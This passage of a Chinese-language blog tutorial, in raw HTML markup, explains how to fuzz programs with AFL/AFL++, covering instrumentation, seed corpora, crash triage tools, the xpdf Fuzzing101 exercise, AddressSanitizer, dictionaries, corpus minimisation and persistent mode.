class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br><br>  <span class="hljs-keyword">if</span> (read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hum?\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;0&#x27;</span>)<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Looks like a zero to me!\n&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;A non-zero value? How quaint!\n&quot;</span>);<br><br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>首先通过</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">afl-gcc <span class="hljs-keyword">test</span>.c -o <span class="hljs-keyword">test</span><br></code></pre></td></tr></table></figure><p>通过<code>afl-gcc</code>编译后的文件会在<code>test</code>程序中进行插桩。</p><p>之后我们需要创建<code>in</code>目录和<code>out</code>目录作为输入输出目录。</p><p>并且我们需要在<code>in</code>目录中创建文件作为基础语料样本，afl会自动根据样本变异。</p><p>如：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">aaaaaaaaaaaaaaaaaa</span><br></code></pre></td></tr></table></figure><p>之后我们便可以执行以下命令开始 fuzz。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">afl-fuzz -i <span class="hljs-keyword">in</span> -o <span class="hljs-keyword">out</span> <span class="hljs-comment">-- ./test   </span><br></code></pre></td></tr></table></figure><h3 id="AFL状态窗口"><a href="#AFL状态窗口" class="headerlink" title="AFL状态窗口"></a>AFL状态窗口</h3><p><img src="/Linux/assets/Pasted%20image%2020250312230349.png"></p><p>为了帮助您决定何时按Ctrl-C停止，循环计数器会进行颜色编码。在第一次循环时，计数器显示为品红色，如果后续循环仍然有新发现，它会变为黄色，然后变成蓝色，最终当模糊器一段时间没有看到新发现时，会变成绿色。</p><p>AFL 的终端 UI 使用不同颜色来快速提示运行状态：</p><table><thead><tr><th>颜色</th><th>含义说明</th></tr></thead><tbody><tr><td>🟢 <strong>绿色</strong></td><td>状态正常，如稳定、正在处理、fuzzing 正常进行</td></tr><tr><td>🔴 <strong>红色</strong></td><td><strong>严重问题</strong>，可能阻碍模糊测试效果</td></tr><tr><td>🟣 <strong>紫色</strong></td><td><strong>警告状态</strong>，可能代表性能低下、覆盖率差或待调优</td></tr><tr><td>🟡 <strong>黄色</strong></td><td>次要警告，例如语料库待优化、初始阶段慢等</td></tr><tr><td>⚪ <strong>白色&#x2F;灰色</strong></td><td>静态信息或普通文本</td></tr></tbody></table><ul><li>Process timing:Fuzzer运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间。</li><li>Overall results：Fuzzer当前状态的概述。</li><li>Cycle progress：我们输入队列的距离。</li><li>Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节。</li><li>Stage progress：Fuzzer现在正在执行的文件变异策略、执行次数和执行速度。</li><li>Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息。</li><li>Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息。</li><li>Path geometry：有关Fuzzer找到的执行路径的信息。</li><li>CPU load：CPU利用率</li></ul><p>语料库</p><p>AFL 需要一些初始输入数据（也叫种子文件）作为 Fuzzing 的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法自动确定文件格式结构。</p><p>种子的选择：</p><ul><li>有效的输入<ul><li>目标可以解析的种子，有效输入可以更快的找到更多执行路径。</li></ul></li><li>尽量小的体积<ul><li>较小的文件会不仅可以减少测试和处理的时间，也能节约更多的内存，AFL给出的建议是最好小于1 KB，但其实可以根据自己测试的程序权衡，这在AFL文档的<code>perf_tips.txt</code>中有具体说明。</li></ul></li></ul><p>寻找：</p><ol><li>使用项目自身提供的测试用例</li><li>目标程序bug提交页面</li><li>使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式：</li><li>afl源码的testcases目录下提供了一些测试用例</li><li>其他大型的语料库</li></ol><h3 id="结束fuzz"><a href="#结束fuzz" class="headerlink" title="结束fuzz"></a>结束fuzz</h3><p>状态窗口中”cycles done”字段颜色变为绿色该字段的颜色可以作为何时停止测试的参考，随着周期数不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。当其变为绿色时，继续Fuzzing下去也很难有新的发现了，这时便可以通过Ctrl-C停止afl-fuzz。</p><p> 距上一次发现新路径（或者崩溃）已经过去很长时间了，至于具体多少时间还是需要自己把握，比如长达一个星期或者更久估计大家也都没啥耐心了吧。</p><p>目标程序的代码几乎被测试用例完全覆盖，这种情况好像很少见，但是对于某些小型程序应该还是可能的，至于如何计算覆盖率将在下面介绍。</p><p>上面提到的pythia提供的各种数据中，一旦<strong>path covera</strong>达到99％（通常来说不太可能），如果不期望再跑出更多crash的话就可以中止fuzz了，因为很多crash可能是因为相同的原因导致的；还有一点就是<strong>correctness</strong>的值达到<strong>1e-08</strong>，根据pythia开发者的说法，这时从上次发现path&#x2F;uniq crash到下一次发现之间大约需要1亿次执行，这一点也可以作为衡量依据。</p><h3 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h3><ul><li>queue：存放所有具有独特执行路径的测试用例。  </li><li>crashes：导致目标接收致命signal而崩溃的独特测试用例。  </li><li>crashes&#x2F;README.txt：保存了目标执行这些crash文件的命令行参数。  </li><li>hangs：导致目标超时的独特测试用例。  </li><li>fuzzer_stats：afl-fuzz的运行状态。  </li><li>plot_data：用于afl-plot绘图。</li></ul><h3 id="处理测试结果"><a href="#处理测试结果" class="headerlink" title="处理测试结果"></a>处理测试结果</h3><ul><li>crash exploration mode</li></ul><p>这是afl-fuzz的一种运行模式，也称为<strong>peruvian rabbit mode</strong>，用于确定bug的可利用性</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">afl-fuzz -m <span class="hljs-attribute">none</span> -C -<span class="hljs-selector-tag">i</span> poc -o peruvian-were-rabbit_out -- ~/<span class="hljs-attribute">src</span>/LuPng/<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.out</span> @@ out.png<br></code></pre></td></tr></table></figure><ul><li>triage_crashes</li></ul><p>AFL源码的experimental目录中有一个名为_triage_crashes.sh_的脚本，可以帮助我们触发收集到的crashes。例如下面的例子中，11代表了SIGSEGV信号，有可能是因为缓冲区溢出导致进程引用了无效的内存；06代表了SIGABRT信号，可能是执行了abort\assert函数或double free导致，这些结果可以作为简单的参考。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">triage_crashes.sh fuzz_out ~/src/LuPng/a.out<br></code></pre></td></tr></table></figure><ul><li>crashwalk</li></ul><p>当然上面的两种方式都过于鸡肋了，如果你想得到更细致的crashes分类结果，以及导致crashes的具体原因，那么<a href="https://github.com/bnagy/crashwalk">crashwalk</a>就是不错的选择之一。这个工具基于gdb的exploitable插件，安装也相对简单，在ubuntu上，只需要如下几步即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install gdb golang</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> tools</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> tools</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/jfoote/exploitable.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> go</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">export</span> GOPATH=~/tools/go</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">export</span> CW_EXPLOITABLE=~/tools/exploitable/exploitable/exploitable.py</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">go get -u github.com/bnagy/crashwalk/cmd/...</span><br></code></pre></td></tr></table></figure><p>crashwalk支持AFL&#x2F;Manual两种模式。前者通过读取<strong>crashes&#x2F;README.txt</strong>文件获得目标的执行命令（前面第三节中提到的），后者则可以手动指定一些参数。两种使用方式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">Manual Mode</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">~/tools/go/bin/cwtriage -root syncdir/fuzzer1/crashes/ -match <span class="hljs-built_in">id</span> -- ~/parse @@</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">AFL Mode</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">~/tools/go/bin/cwtriage -root syncdir -afl</span><br></code></pre></td></tr></table></figure><ul><li>afl-collect</li></ul><p>最后重磅推荐的工具便是_afl-collect_，它也是_afl-utils_套件中的一个工具，同样也是基于exploitable来检查crashes的可利用性。它可以自动删除无效的crash样本、删除重复样本以及自动化样本分类。使用起来命令稍微长一点，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">afl-collect -j 8 -d crashes.db -e gdb_script ./afl_sync_dir ./collection_dir --  /path/to/target --target-opts</span><br></code></pre></td></tr></table></figure><h2 id="基础实例"><a href="#基础实例" class="headerlink" title="基础实例"></a>基础实例</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><ul><li>编译</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">进入项目目录</span><br>cd /root/Fuzzing101/Exercise1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装编译工具</span><br>sudo apt install build-essential<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">下载xpdf源码</span><br>wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz<br>tar -xvzf xpdf-3.02.tar.gz<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">编译</span><br>cd xpdf-3.02<br>./configure --prefix=&quot;/root/Fuzzing101/Exercise1/xpdf-3.02/install/&quot;<br>make<br>make install<br></code></pre></td></tr></table></figure><ul><li>测试</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd <br>mkdir pdf_examples &amp;&amp; cd pdf_examples<br>wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf<br>wget http://www.africau.edu/images/default/sample.pdf<br>wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf<br></code></pre></td></tr></table></figure><h3 id="编译插桩"><a href="#编译插桩" class="headerlink" title="编译插桩"></a>编译插桩</h3><ul><li>afl-gcc</li><li>afl-clang-fast</li><li>afl-clang-lto</li></ul><p>afl-clang-lto是当前最佳选择，其优势包括：</p><ul><li>无冲突插桩</li><li>比afl-clang-fast更快</li><li>提供更好的测试结果</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">使用afl-clang-fast编译</span><br>cd xpdf-3.02<br>export LLVM_CONFIG=&quot;llvm-config-11&quot;<br>CC=&quot;/AFLplusplus/afl-clang-fast&quot; CXX=&quot;/AFLplusplus/afl-clang-fast++&quot; \<br>./configure --prefix=&quot;/root/Fuzzing101/Exercise1/xpdf-3.02/install&quot;<br>make<br>make install<br></code></pre></td></tr></table></figure><h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><ul><li>开始Fuzz</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-fuzz -i in -o out -s 123 -- xpdf-3.02/install/bin/pdftotext   -- xpdf-3.02/install/bin/pdftotext @@ xpdf-3.02/install output<br></code></pre></td></tr></table></figure><ul><li><code>-i</code>：输入种子目录</li><li><code>-o</code>：输出目录</li><li><code>-s</code>：随机种子</li><li><code>--</code>：设置测试目标</li><li><code>@@</code>：占位符，表示AFL会将变异后的文件作为参数传递给目标程序。</li></ul><p>若出现核心转储提示，执行：</p><p>跑了三个小时。。</p><p><img src="/Linux/assets/Pasted%20image%2020250414145110.png"></p><h3 id="crash分析"><a href="#crash分析" class="headerlink" title="crash分析"></a>crash分析</h3><p>gdb调试</p><p>首先定义到发生崩溃的点，动静结合。</p><p>通过ida静态分析结合动态分析进行定位。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gdb --args $HOME/Desktop/Fuzz/training/fuzzing_xpdf/install/bin/pdftotext $HOME/Desktop/Fuzz/training/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:000182,time:11158,execs:4841,op:havoc,rep:2 $HOME/Desktop/Fuzz/training/fuzzing_xpdf/output<br></code></pre></td></tr></table></figure><h3 id="vscode-gdb分析"><a href="#vscode-gdb分析" class="headerlink" title="vscode+gdb分析"></a>vscode+gdb分析</h3><p>通过 vscode+gdb 进行动态调试。</p><p>在 vscode 要调试的文件目录下创建一个<code>.vscode</code>目录，并在目录下编写一个<code>launch.json</code>文件。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.2.0&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Debug&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gdb&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;launch&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;target&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./uaf&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;cwd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;valuesFormatting&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;parseText&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h2><h3 id="ASan"><a href="#ASan" class="headerlink" title="ASan"></a>ASan</h3><p>AddressSanitizer (ASan) 是 Google 开发的 C&#x2F;C++ 内存错误检测工具，包含：</p><ul><li>编译器插桩模块</li><li>运行时库</li></ul><p>可检测以下问题：</p><ul><li>堆&#x2F;栈&#x2F;全局变量的越界访问</li><li>释放后使用（use-after-free）</li><li>重复释放</li><li>内存泄漏</li></ul><p>首先我们来了解一下什么是 ASan。ASan 一个 C 和 C++ 的内存错误检查工具，包含一个编译器插桩模块和一个运行时库，可以发现对堆、栈等内存破坏漏洞。</p><p>AddressSanitizer，又称 <strong>ASAN</strong>，整合了 LeakSanitizer (<strong>LSAN</strong>)，用于 C&#x2F;C++ 中检测内存错误。由于能够检测到越界、use-after-free 和内存泄漏等问题，通常在大多数 fuzzing 中都会使用，约会导致 2x 的 slowdown。AddressSanitizer 有发表论文 <a href="https://static.googleusercontent.com/media/research.google.com/zh-TW//pubs/archive/37752.pdf">AddressSanitizer: A Fast Address Sanity Checker</a>，较为简洁的说明可以参考<a href="https://suelan.github.io/2020/08/18/20200817-address-sanitizer/">此网站</a>的介绍，下面只会做简单的介绍。</p><p>每个变量都会有自己的内存空间来存储值，也就是下方图示中的 <code>var&#123;1,2,3,4&#125;</code> 各自的方格，而这些内存有一个重要的特性：都是<strong>连续分配</strong>，因此如果变量 <code>var1</code> 发生越界漏洞，有可能会影响到 <code>var&#123;2,3,4&#125;</code> 的值，从而改变原本程序的执行流程。</p><p>然而 ASAN 会在原本的连续内存中间插入 <strong>red zone</strong>，代表这些是不应被访问的内存区域。如果 <code>var1</code> 会影响到 <code>var&#123;2,3,4&#125;</code>，很有可能也会修改到中间的 red zone，因此我们可以通过检查 red zone 是否被污染来判断漏洞的发生。</p><p><img src="/Linux/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/assets/3-0.png"><br>因此在每次进行内存访问前，会检查访问地址是否位于 red zone，如果是，就会触发 asan 报告，将错误原因输出。</p><p>实际使用 <strong>shadow memory</strong> 技术来优化访问速度。假设访问的内存地址为 0x87870000，首先会将该地址右移三个 3 位 (1)，再加上一个固定的偏移量 (2)，得到的内存地址就是 shadow memory。</p><p>shadow memory 中存放的值表示要访问的内存类型，如果值为 00，表示正常范围，01~07 表示内存本来就不对齐，因此还需要考虑内存访问时的偏移量 (4)。而小于 0 的值表示漏洞发生 (3)，并且不同的值代表不同的意义。举例来说，当发生 <strong>Freed heap region</strong> (UAF) 漏洞时，值就会是 <code>fd</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *a;  <br><span class="hljs-type">char</span> magic;  <br><span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> shadow_mem_addr;  <br>​  <br>a = (<span class="hljs-type">void</span> *)<span class="hljs-number">0x87870000</span>;  <br>shadow_mem_addr = (<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span>)a &gt;&gt; <span class="hljs-number">3</span>; <span class="hljs-comment">// (1)  </span><br>shadow_mem_addr += <span class="hljs-number">0x7fff8000</span>; <span class="hljs-comment">// (2)  </span><br>magic = *(<span class="hljs-type">char</span> *)shadow_mem_addr;  <br>​  <br><span class="hljs-keyword">if</span> (magic &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">// (3)  </span><br>    dump_and_abort();  <br>​  <br><span class="hljs-keyword">if</span> ( ((<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span>)a &amp; <span class="hljs-number">7</span>) &gt; magic) <span class="hljs-comment">// (4)  </span><br>    dump_and_abort();<br></code></pre></td></tr></table></figure><p>一开始用 <code>var&#123;1,2,3,4&#125;</code> 做介绍，这里用 <code>var&#123;1,2&#125;</code> 示范 shadow memory 的应用：</p><p><img src="/Linux/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/assets/3-1.png"></p><p>而 <strong>leak checker</strong> (LSAN) 会在程序结束执行前执行另一个进程，并通过 ptrace 来 attach 当前的进程。接着会分析：1. 全局变量、2. 正在执行线程的栈、3. 正在执行线程的寄存器、4. TLS 中存放的数据。这些内存地址中的值会形成 root set。之后，LSAN 会检查 root set 的值是否指向 heap block 的指针，并且该块内存仍是活跃的，表示仍在被使用。</p><p>要启用ASAN，请在执行<code>make clean all</code>之前设置<code>AFL_USE_ASAN=1</code>。<code>afl-gcc</code> &#x2F; <code>afl-clang</code>包装器会自动添加适当的标志。请注意，ASAN与<code>-static</code>不兼容，因此需要特别注意。</p><ul><li>编译插桩</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd $HOME/fuzzing_tcpdump/libpcap-1.8.0/<br>export LLVM_CONFIG=&quot;llvm-config-11&quot;<br>CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;<br>AFL_USE_ASAN=1 make<br><br>cd $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">通过设置环境变量启动ASan</span><br>AFL_USE_ASAN=1 CC=afl-clang-lto ./configure --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;<br>AFL_USE_ASAN=1 make<br>AFL_USE_ASAN=1 make install<br></code></pre></td></tr></table></figure><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><p>当我们想要对复杂的基于文本的格式文件（如 XML）进行模糊测试时，通常会使用一个包含基本语法标记的字典。在 AFL 中，字典是一组预定义的、具有特殊格式含义的字段（如 XML 标签等）。</p><p>AFL 利用这些字段对测试输入进行变异操作，主要包括：</p><ul><li>覆盖：使用字典中的某个字段替换输入文件中指定位置的字节，替换长度与字段长度一致。</li><li>插入：将字典字段插入到文件当前位置，原有内容向后移动，导致文件大小增加。</li></ul><p>字典可以帮助 AFL 在变异过程中生成更符合目标格式规范的测试用例，从而提高模糊测试的效率和有效性。在 AFL 项目的<code>dictionaries</code>目录下就存放着很多格式的字典文件。</p><p><img src="/Linux/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/assets/Pasted%20image%2020250420213106.png"></p><h3 id="语料优化"><a href="#语料优化" class="headerlink" title="语料优化"></a>语料优化</h3><p>最小化测试用例</p><p>文件大小对模糊测试性能有显著影响，主要因为大文件会使目标二进制程序运行变慢，同时也减少了突变操作触及重要格式控制结构的可能性，而这些结构可能会被冗余数据块覆盖。</p><p>除了用户可能提供低质量的初始测试用例外，有些类型的突变可能会导致生成的文件逐渐变大，因此必须采取措施来抵消这种趋势。</p><p>幸运的是，仪器反馈提供了一种简单的方法来自动修剪输入文件，同时确保文件所做的修改不会影响执行路径。</p><p>内置的 AFL 修剪工具（trimmer）尝试顺序删除具有可变长度和步幅的数据块；任何不会影响执行路径的删除都会被保存到磁盘。这个修剪器并不是特别彻底；相反，它力求在精确度和执行过程中的<code>execve()</code>调用次数之间找到平衡，选择合适的块大小和步幅。每个文件的平均修剪增益大约为5-20%。</p><p>独立的<code>afl-tmin</code>工具使用更为详尽的迭代算法，并尝试对修剪后的文件进行字母表标准化。<code>afl-tmin</code>的工作流程如下：</p><p>首先，工具会自动选择操作模式。如果初始输入导致目标二进制程序崩溃，<code>afl-tmin</code>将在未加仪器的模式下运行，仅保留那些能够简化文件但仍导致崩溃的修改。如果目标程序没有崩溃，则使用加仪器的模式，只保留那些能够产生完全相同执行路径的修改。</p><p>实际的最小化算法为：</p><ol><li>尝试将大数据块置零并使用大步幅。通过经验，这能够通过预先处理较大的修改，避免后续细粒度操作中频繁的<code>exec</code>调用。</li><li>通过逐步减少块大小和步幅（类似二分查找）进行块删除操作。</li><li>通过计算唯一字符并尝试将每个字符替换为零值，执行字母表标准化。</li><li>最后，针对非零字节执行逐字节标准化。</li></ol><p><code>afl-tmin</code>使用ASCII数字<code>0</code>而不是<code>0x00</code>来置零。这是因为这种修改更不容易干扰文本解析，因此更有可能成功简化文本文件。</p><p>该算法没有一些学术研究提出的复杂测试用例最小化方法，但需要的执行次数远少，且在大多数实际应用中产生的结果可比。</p><p>对用例进行裁剪，afl-tmin 用于对单个样本的裁剪，afl-cmin用于对样本集合的裁剪，将路径相同的样本删除只保留一个</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">指令格式： afl-cmin -i 样本目录 -o 输出目录 [-Q] -- 要fuzz的可执行程序 [程序参数]</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">指令格式： afl-tmin -i 样本文件 -o 输出文件 [-Q] -- 要fuzz的可执行程序 [程序参数]</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">其中 <span class="hljs-string">&#x27;要fuzz的可执行程序&#x27;</span> 必须是带有路径的，不能直接使用，比如 <span class="hljs-string">&#x27;djpeg 1.jpeg&#x27;</span> 可以执行成功，但是fuzz时必须将 <span class="hljs-string">&#x27;djpeg&#x27;</span> 的路径一并带上才可以，即 <span class="hljs-string">&#x27;/usr/bin/djpeg&#x27;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">默认情况下afl-cmin和afl-tmin会把样本以标准输出的方式喂给要fuzz的程序，如果fuzz程序是从参数指定的文件中读取数据进行处理的，则需要使用 <span class="hljs-string">&#x27;@@&#x27;</span> 来代替输入的文件路径，比如原本执行的指令为 <span class="hljs-string">&#x27;djpeg in_afl_min/1.jpeg&#x27;</span> ，fuzz时指令应为 <span class="hljs-string">&#x27;/usr/bin/djpeg @@&#x27;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">在安装了qemu-mode时，可以支持 <span class="hljs-string">&#x27;-Q&#x27;</span> 选项，如果目标可执行程序</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">当然这两个指令还有一些其它参数，这里就不介绍使用了，以上为常见用法</span><br><br>afl-cmin -i in_afl -o in_afl_min -Q -- /usr/bin/djpeg @@<br>afl-tmin -i in_afl_min/1.jpeg -o in_afl_min/1_new.jpeg -Q -- /usr/bin/djpeg @@<br></code></pre></td></tr></table></figure><h3 id="持久模式"><a href="#持久模式" class="headerlink" title="持久模式"></a>持久模式</h3><p>AFL 的默认行为是每次测试一个新的输入样本时就 fork 一个新的进程。这对启动速度较慢的程序（比如大型程序）效率较低。</p><p>持久化模式（Persistent Mode） 是 AFL 提供的一种可以加快 Fuzz 执行速度的功能。持久化模式基于进程内模糊测试技术，通过以下方式提升效率：</p><ul><li>在单个进程中多次执行测试（而非每次 fork 新进程）</li><li>只 fork 一次，循环执行目标代码，每次处理一个输入。</li><li>大幅减少进程创建与销毁的开销。</li><li>速度可提升高达20倍</li></ul><p>简单理解为无需每次都进行 fork 操作，而只是在程序的某一特定位置进行循环 fuzz。</p><p>基本代码结构：</p><p>配置持久模式的两种方式：</p><ul><li>使用<code>__AFL_LOOP()</code>宏</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 程序初始化  </span><br><span class="hljs-keyword">while</span> (__AFL_LOOP(<span class="hljs-number">10000</span>)) &#123;  <br>  <span class="hljs-comment">/* 读取输入数据 */</span>  <br>  <span class="hljs-comment">/* 调用待测试库代码 */</span>   <br>  <span class="hljs-comment">/* 重置状态 */</span>  <br>&#125;  <br><span class="hljs-comment">// 测试结束</span><br></code></pre></td></tr></table></figure><ul><li>通过宏插入</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __AFL_COMPILER</span><br>  <span 